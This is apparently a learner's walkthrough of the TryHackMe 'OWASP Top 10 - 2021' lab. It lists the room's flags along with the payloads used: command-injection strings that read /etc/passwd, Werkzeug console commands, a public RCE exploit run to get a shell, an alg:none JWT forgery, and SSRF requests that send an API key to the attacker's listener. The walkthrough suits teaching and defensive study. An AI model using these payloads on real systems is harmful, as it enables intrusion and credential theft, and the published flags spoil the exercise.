# TryHackMe - OWASP Top 10 - 2021

**Room**: OWASP Top 10 - 2021  
**URL**: https://tryhackme.com/room/owasptop102021  

---

## Room Overview

This TryHackMe room covers the OWASP Top 10 - 2021, providing hands-on experience with the most critical web application security risks. Each vulnerability includes practical exploitation techniques and real-world security implications.

**OWASP Top 10 Vulnerabilities:**
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)

---

## Tasks Completed

### Task 1: Introduction
Understanding the OWASP Top 10 framework and its importance in web application security.

### Task 2: Accessing Machines
Connected to TryHackMe network and deployed vulnerable lab machines.

---

### Task 3-4: Broken Access Control (IDOR)

**What is IDOR?**
Insecure Direct Object Reference - accessing resources by manipulating reference parameters without authorization checks.

**Target**: `http://MACHINE_IP`  
**Credentials**: `noot:test1234`

**Exploitation:**
```
1. Login to application
2. Navigate to notes section
3. Observe URL: ?note_id=1
4. Change parameter: ?note_id=2, ?note_id=3
5. Access other users' notes without authorization
```

**Flag**: `flag{fivefourthree}`

**Key Insight**: Applications must validate authorization for every object access, not just authentication.

---

### Task 5-8: Cryptographic Failures

**Target**: `http://MACHINE_IP:81/`

**Step 1: Source Code Analysis**
- Viewed page source (CTRL + U)
- Found developer comment revealing sensitive directory
- **Directory**: `/assets`

**Step 2: Database Discovery**
```bash
# Navigate to /assets directory
# Found file: webapp.db
# Downloaded database file
```

**Step 3: SQLite Database Analysis**
```bash
ls -l
sqlite3 webapp.db
.tables
PRAGMA table_info(users);
SELECT * FROM users;
```

**Extracted Hash**: `6eea9b7ef19179a06954edd0f6c05ceb`

**Step 4: Hash Cracking**
- Tool: CrackStation (https://crackstation.net/)
- Hash type: MD5
- **Cracked Password**: `qwertyuiop`

**Step 5: Admin Access**
- Username: `admin`
- Password: `qwertyuiop`
- **Flag**: `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`

**Key Insight**: Sensitive data (databases, credentials) should never be accessible in web directories. Use strong hashing algorithms (bcrypt, Argon2) instead of MD5.

---

### Task 9-10: Command Injection

**Target**: `http://MACHINE_IP:82/` (Cowsay application)

**Commands Injected:**
```bash
$(whoami)          # Returns: apache
$(ls)              # Returns: css drpepper.txt index.php js
$(ls -la)          # Detailed directory listing
$(cat /etc/passwd) # System users
$(cat /etc/os-release) # OS information
$(awk -F: '$3 >= 1000' /etc/passwd) # Filter standard users
```

**Findings:**
- Strange file: `drpepper.txt`
- Non-root/non-service/non-daemon users: `0`
- User: `apache`
- User shell: `/sbin/nologin`
- Alpine Linux version: `3.16.0`

**Key Insight**: Never trust user input. Always validate and sanitize input before passing to system commands. Use parameterized commands or safe APIs.

---

### Task 11-12: Insecure Design

**Target**: `http://MACHINE_IP:85`  
**Objective**: Exploit password reset mechanism for user `joseph`

**Exploitation:**
```
1. Navigate to "I forgot my password"
2. Enter username: joseph
3. Security question: "What is your favorite color?"
4. Tested common colors: Red, red, Orange, Yellow
5. Successful answer: green (case-sensitive)
6. System generated temporary password
7. Login with new credentials
8. Navigate to Private → Flag.txt
```

**Flag**: `THM{Not_3ven_c4tz_c0uld_sav3_U!}`

**Key Insight**: Security questions with easily guessable answers (colors, pets, cities) provide weak authentication. Implement MFA or more robust recovery mechanisms.

---

### Task 12: Security Misconfiguration

**Target**: `http://MACHINE_IP:86/console` (Werkzeug Debug Console)

**Exploitation:**

**Step 1: Directory Listing**
```python
import os; print(os.popen("ls -l").read())
```
**Result**: `todo.db`

**Step 2: Source Code Extraction**
```python
import os; print(os.popen("cat app.py").read())
```
**Result**: Found `secret_flag` variable

**Flag**: `THM{Just_a_tiny_misconfiguration}`

**Key Insight**: Debug consoles, development tools, and verbose error messages must be disabled in production. Implement proper environment configurations.

---

### Task 13-15: Vulnerable and Outdated Components

**Target**: Bookstore application at `http://MACHINE_IP`

**Exploitation:**
```bash
# Research exploit on Exploit-DB
# Search: "bookstore"
# Found: exploit 47887.py (Online Book Store RCE)

# Download and execute exploit
python3 47887.py http://MACHINE_IP

# Launch shell (type 'y' when prompted)
y

# Read flag
cat /opt/flag.txt
```

**Flag**: `THM{But_1ts_n0t_myf4ult!}`

**Key Insight**: Keep all components updated. Regularly scan for known vulnerabilities using tools like OWASP Dependency-Check or Snyk. Subscribe to security advisories.

---

### Task 16-17: Identification and Authentication Failures

**Target**: `http://MACHINE_IP`

**Vulnerability**: Username bypass using whitespace

**Exploitation:**

**Attempt 1: Direct Registration**
```
Username: darren
Result: "Error: This user is already registered"
```

**Attempt 2: Whitespace Bypass**
```
Username: " darren" (space before username)
Email: your@email.com
Password: your_password
Result: Successfully registered with same privileges
```

**Accessing darren's account:**
- **Flag**: `fe86079416a21a3c99937fea8874b667`

**Accessing arthur's account:**
```
Username: " arthur" (space before username)
Email: your@email.com
Password: your_password
```
- **Flag**: `d9ac0f7db4fda460ac3edeb75d75e16e`

**Key Insight**: Properly sanitize and validate all user inputs, especially usernames. Implement trimming, normalization, and case-insensitive uniqueness checks.

---

### Task 18-19: Software Integrity Failures

**Objective**: Generate SRI hash for jQuery library

**Tool**: https://www.srihash.org/

**URL to Hash**: `https://code.jquery.com/jquery-1.12.4.min.js`  
**Algorithm**: SHA-256

**Hash**: `sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=`

**What is SRI?**
Subresource Integrity allows browsers to verify that fetched resources haven't been tampered with by comparing cryptographic hashes.

**Key Insight**: Always use SRI hashes for external resources (CDNs) to prevent supply chain attacks and malicious code injection.

---

### Task 20: Data Integrity Failures (JWT Manipulation)

**Target**: `http://MACHINE_IP:8089/`

**Step 1: Login as Guest**
```
Username: guest
Password: guest
```

**Step 2: Extract JWT Token**
- Open Developer Tools: SHIFT + F12
- Navigate to: Storage → Cookies
- Cookie name: `jwt-session`

**JWT Token:**
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjg2MzIxNjI2fQ.L159cLhW34u6BYodwGSJwHftLw34J-zKQF9Xo1uYBVA
```

**Step 3: Decode JWT**
Tool: https://appdevtools.com/base64-encoder-decoder

**Header (Decoded):**
```json
{"typ":"JWT","alg":"HS256"}
```

**Payload (Decoded):**
```json
{"username":"guest","exp":1686321626}
```

**Step 4: Modify JWT**

**Modified Header:**
```json
{"typ":"JWT","alg":"none"}
```

**Modified Payload:**
```json
{"username":"admin","exp":1686321626}
```

**Step 5: Encode and Replace**
- Encode modified header and payload separately
- Combine: `[Encoded_Header].[Encoded_Payload].`
- Replace cookie value with modified JWT
- Refresh page

**Flag**: `THM{Dont_take_cookies_from_strangers}`

**Key Insight**: Never accept JWT tokens with "alg":"none". Always verify signatures server-side. Use strong signing algorithms (RS256, ES256) and secret keys.

---

### Task 21: Security Logging and Monitoring Failures

**Objective**: Analyze login logs for suspicious activity

**Log Analysis:**
- Downloaded: `login-logs.txt`
- Reviewed authentication attempts

**Findings:**
- **Attacker IP**: `49.99.13.16`
- **Time span**: 15 seconds
- **Pattern**: Multiple usernames, same IP
- **Attack type**: Brute Force

**Indicators:**
- Rapid successive login attempts
- Multiple different usernames
- Single source IP address
- High volume of failed authentications

**Key Insight**: Implement comprehensive logging, real-time monitoring, and automated alerting for authentication anomalies. Use SIEM solutions for pattern detection.

---

### Task 22: Server-Side Request Forgery (SSRF)

**Target**: `http://MACHINE_IP:8087/`

**Challenge 1: Identify Access Restrictions**
- Attempted to access Admin Area
- Error: "Access denied. Only localhost can access"
- **Answer**: `localhost`

**Challenge 2: Download Resume Parameter**
```html
<!-- Inspected download button -->
<button onclick="download('secure-file-storage.com')">
```
**Server parameter**: `secure-file-storage.com`

**Challenge 3: SSRF Exploitation**

**Original URL:**
```
http://MACHINE_IP:8087/download?server=secure-file-storage.com:8087&id=75482342
```

**Setup Netcat Listener:**
```bash
nc -lvnp 8087
```

**Modified URL (AttackBox IP):**
```
http://MACHINE_IP:8087/download?server=YOUR_ATTACKBOX_IP:8087&id=75482342
```

**Result**: Intercepted API key in request

**Flag**: `THM{Hello_Im_just_an_API_key}`

**Extra Challenge: Admin Area Access**

**Technique**: URL encoding to bypass filters

**Payload:**
```
server=http://localhost:8087/admin%23&id=75482342
```

**Explanation:**
- `%23` = URL-encoded `#` (hash symbol)
- Comments out everything after it
- Breaks parameter parsing
- Redirects to admin endpoint

**Complete URL:**
```
http://MACHINE_IP:8087/download?server=http://localhost:8087/admin%23&id=75482342
```

**Key Insight**: Validate and whitelist all URLs. Implement proper input sanitization. Use network segmentation to limit internal access.

---

### Task 23: What's Next?

Completed OWASP Top 10 - 2021 room. Gained practical experience with critical web vulnerabilities.

---

## Technical Analysis

### Attack Methodologies Used:

**Reconnaissance:**
- Source code analysis
- Directory enumeration
- Parameter manipulation
- Form inspection

**Exploitation:**
- IDOR parameter tampering
- SQL database extraction
- Command injection
- JWT manipulation
- SSRF payload crafting
- Brute force analysis

**Post-Exploitation:**
- Flag extraction
- Database analysis
- Log review
- Admin access

---

## Tools and Techniques

**Web Analysis:**
- Browser Developer Tools (F12)
- Source code inspection (CTRL + U)
- Network traffic monitoring
- Cookie manipulation

**Database:**
- SQLite3 for database analysis
- PRAGMA commands for schema inspection
- SELECT queries for data extraction

**Hash Cracking:**
- CrackStation for MD5 hashes
- Identifying weak hashing algorithms

**Encoding/Decoding:**
- Base64 encoding/decoding
- URL encoding for SSRF bypasses
- JWT structure manipulation

**Network:**
- Netcat for listening and interception
- HTTP parameter manipulation
- SSRF payload construction

**Research:**
- Exploit-DB for known vulnerabilities
- CVE databases
- Security advisories

---

## Security Applications

### Offensive Security:
- **Penetration Testing**: Identifying web application vulnerabilities
- **Red Team Operations**: Simulating real-world attack scenarios
- **Vulnerability Assessment**: Discovering security weaknesses
- **Security Research**: Understanding attack vectors

### Defensive Security:

**Access Control:**
- Implement proper authorization checks
- Validate object access permissions
- Use indirect references (UUIDs)

**Cryptography:**
- Strong hashing algorithms (bcrypt, Argon2)
- Secure password storage
- SRI for external resources
- Proper JWT implementation

**Input Validation:**
- Sanitize all user inputs
- Use parameterized queries
- Whitelist validation
- Output encoding

**Authentication:**
- Strong password policies
- Multi-factor authentication
- Account lockout mechanisms
- Username normalization

**Monitoring:**
- Comprehensive logging
- Real-time alerting
- SIEM integration
- Anomaly detection

---

## Defensive Recommendations

### Application Security:

**Access Control:**
- Implement role-based access control (RBAC)
- Validate authorization for every request
- Use indirect object references
- Implement least privilege principle

**Data Protection:**
- Encrypt sensitive data at rest and in transit
- Use strong cryptographic algorithms
- Never store passwords in plaintext
- Implement proper key management

**Input Validation:**
- Validate and sanitize all inputs
- Use prepared statements for SQL
- Implement Content Security Policy (CSP)
- Encode outputs to prevent XSS

**Authentication:**
- Enforce strong password requirements
- Implement MFA/2FA
- Use secure session management
- Implement account lockout policies

**Configuration:**
- Disable debug modes in production
- Remove default credentials
- Keep all components updated
- Implement security headers

**Monitoring:**
- Log all authentication events
- Monitor for anomalous behavior
- Implement real-time alerting
- Regular security audits

---

## Key Learning Points

### Vulnerability Understanding:

**Broken Access Control:**
- Authorization must be verified for every request
- Don't rely on obscurity or client-side controls

**Cryptographic Failures:**
- Use modern, strong algorithms
- Never expose sensitive files in web directories

**Injection:**
- Never trust user input
- Use parameterized queries and safe APIs

**Insecure Design:**
- Security must be built-in, not bolted-on
- Weak security questions are easily bypassed

**Security Misconfiguration:**
- Default configurations are often insecure
- Disable debug features in production

**Vulnerable Components:**
- Keep all dependencies updated
- Monitor security advisories

**Authentication Failures:**
- Implement proper input validation
- Use secure session management

**Data Integrity:**
- Verify signatures and hashes
- Don't trust client-side data

**Logging Failures:**
- Comprehensive logging is essential
- Monitor for attack patterns

**SSRF:**
- Validate and whitelist URLs
- Implement network segmentation

---

## Room Completion

**Status**: ✅ 100% Complete  
**Total Tasks**: 23/23  
**Flags Captured**: All objectives met  
**Skills Demonstrated**: Web application security testing, vulnerability exploitation, security analysis

Successfully explored and exploited all OWASP Top 10 - 2021 vulnerabilities, gaining comprehensive hands-on experience with critical web application security risks and their real-world implications.
